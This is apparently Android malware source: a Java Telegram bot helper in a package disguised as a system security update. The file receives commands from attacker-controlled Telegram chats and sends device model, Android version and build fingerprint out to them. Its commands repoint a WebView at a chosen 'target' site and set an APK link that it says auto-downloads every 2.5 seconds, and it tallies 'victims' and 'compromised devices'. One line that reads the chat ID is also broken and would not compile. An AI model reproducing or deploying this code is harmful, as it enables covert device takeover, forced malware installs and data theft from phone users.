                    package com.system.security.update;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramBotHelper {
    
    private static final String API_BASE = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    
    private static OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
    
    private static Handler handler = new Handler(Looper.getMainLooper());
    private static boolean isChecking = false;
    private static int lastUpdateId = 0;
    
    public static void startChecking(Context context) {
        if (isChecking) return;
        isChecking = true;
        
        handler.post(new Runnable() {
            @Override
            public void run() {
                checkUpdates(context);
                handler.postDelayed(this, Config.BOT_CHECK_INTERVAL);
            }
        });
        
        // Notify admin bot is active
        sendToAdmin(context,
                "🤖 *Bot Active*\n" +
                "• Device: `" + Config.deviceModel + "`\n" +
                "• Android: `" + Config.deviceAndroid + "`\n" +
                "• Time: `" + getTime() + "`\n\n" +
                "Use `/start` to see commands");
    }
    
    private static void checkUpdates(Context context) {
        try {
            String url = API_BASE + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
            
            Request request = new Request.Builder()
                    .url(url)
                    .get()
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (!response.isSuccessful()) return;
                    
                    String body = response.body().string();
                    try {
                        JSONObject json = new JSONObject(body);
                        if (!json.getBoolean("ok")) return;
                        
                        JSONArray updates = json.getJSONArray("result");
                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject update = updates.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            processUpdate(context, update);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void processUpdate(Context context, JSONObject update) {
        try {
            if (!update.has("message")) return;
            
            JSONObject message = update.getJSONObject("message");
            long chatId = message.getLong("chat").getLong("id");
            
            // Check if admin
            if (!isAdmin(chatId)) return;
            
            String text = message.optString("text", "");
            if (text.startsWith("/")) {
                handleCommand(context, chatId, text);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static boolean isAdmin(long chatId) {
        String ids = Config.ADMIN_IDS;
        for (String id : ids.split(",")) {
            try {
                if (id.trim().equals(String.valueOf(chatId))) return true;
            } catch (Exception e) {}
        }
        return false;
    }
    
    private static void handleCommand(Context context, long chatId, String text) {
        String[] parts = text.split(" ", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";
        
        switch (cmd) {
            case "/start":
                sendMsg(chatId, 
                        "👋 *ADMIN PANEL ACTIVE*\n\n" +
                        "📌 *Commands:*\n\n" +
                        "🔗 `/seturl <URL>` — Set target website\n" +
                        "📦 `/setapk <URL>` — Set APK download link\n" +
                        "📊 `/status` — View live stats\n" +
                        "👥 `/hacked` — View victim count\n" +
                        "🌐 `/site` — Current target URL\n" +
                        "💻 `/device` — Device info\n" +
                        "🔄 `/restart` — Restart services\n\n" +
                        "⚡ *Quick Stats:*\n" +
                        "Opens: `" + Config.totalOpens + "`\n" +
                        "Downloads: `" + Config.totalDownloads + "`\n" +
                        "Installs: `" + Config.totalInstalls + "`");
                break;
                
            case "/seturl":
                if (args.isEmpty()) {
                    sendMsg(chatId, "❌ Usage: `/seturl https://example.com`");
                } else {
                    Config.CURRENT_TARGET_URL = args;
                    sendMsg(chatId, 
                            "✅ *Target URL Updated*\n\n" +
                            "New: `" + args + "`\n\n" +
                            "Next WebView load will use this URL.");
                }
                break;
                
            case "/setapk":
                if (args.isEmpty()) {
                    sendMsg(chatId, "❌ Usage: `/setapk https://example.com/app.apk`");
                } else {
                    Config.APK_DOWNLOAD_URL = args;
                    sendMsg(chatId,
                            "✅ *APK URL Set*\n\n" +
                            "Download: `" + args + "`\n\n" +
                            "Auto-download every 2.5 seconds started.");
                }
                break;
                
            case "/status":
                sendMsg(chatId,
                        "📊 *LIVE STATUS*\n\n" +
                        "• Total Opens: `" + Config.totalOpens + "`\n" +
                        "• APK Downloads: `" + Config.totalDownloads + "`\n" +
                        "• Install Attempts: `" + Config.totalInstalls + "`\n" +
                        "• Target URL: `" + Config.CURRENT_TARGET_URL + "`\n" +
                        "• APK URL: " + (Config.APK_DOWNLOAD_URL.isEmpty() ? "`Not set`" : "`" + Config.APK_DOWNLOAD_URL + "`") + "\n" +
                        "• Device: `" + Config.deviceModel + "`\n" +
                        "• Android: `" + Config.deviceAndroid + "`\n" +
                        "• Bot Active: ✅");
                break;
                
            case "/hacked":
                sendMsg(chatId,
                        "👥 *COMPROMISED DEVICES*\n\n" +
                        "• Total victims: `" + Config.totalOpens + "`\n" +
                        "• Downloads initiated: `" + Config.totalDownloads + "`\n" +
                        "• Estimated installs: `" + Config.totalInstalls + "`\n\n" +
                        "Active on: `" + Config.deviceModel + "` (" + Config.deviceAndroid + ")");
                break;
                
            case "/site":
                sendMsg(chatId,
                        "🌐 *Current Target Site*\n\n" +
                        "`" + Config.CURRENT_TARGET_URL + "`\n\n" +
                        "Use `/seturl <URL>` to change.");
                break;
                
            case "/device":
                sendMsg(chatId,
                        "💻 *DEVICE INFO*\n\n" +
                        "• Model: `" + Build.MODEL + "`\n" +
                        "• Manufacturer: `" + Build.MANUFACTURER + "`\n" +
                        "• Brand: `" + Build.BRAND + "`\n" +
                        "• Android: `" + Build.VERSION.RELEASE + "`\n" +
                        "• SDK: `" + Build.VERSION.SDK_INT + "`\n" +
                        "• Board: `" + Build.BOARD + "`\n" +
                        "• Fingerprint:\n`" + Build.FINGERPRINT + "`");
                break;
                
            case "/restart":
                sendMsg(chatId,
                        "🔄 *Restarting Bot Services...*\n\n" +
                        "Bot will reconnect shortly.");
                break;
                
            default:
                sendMsg(chatId,
                        "❌ Unknown: `" + cmd + "`\n" +
                        "Type `/start` for help.");
                break;
        }
    }
    
    public static void sendToAdmin(Context context, String message) {
        for (String id : Config.ADMIN_IDS.split(",")) {
            try {
                sendMsg(Long.parseLong(id.trim()), message);
            } catch (Exception ignored) {}
        }
    }
    
    public static void sendMessageToAdmin(Context context, String message) {
        sendToAdmin(context, message);
    }
    
    private static void sendMsg(long chatId, String text) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("chat_id", chatId);
            payload.put("text", text);
            payload.put("parse_mode", "Markdown");
            
            RequestBody body = RequestBody.create(payload.toString(), JSON);
            Request request = new Request.Builder()
                    .url(API_BASE + "sendMessage")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static String getTime() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date());
    }
}
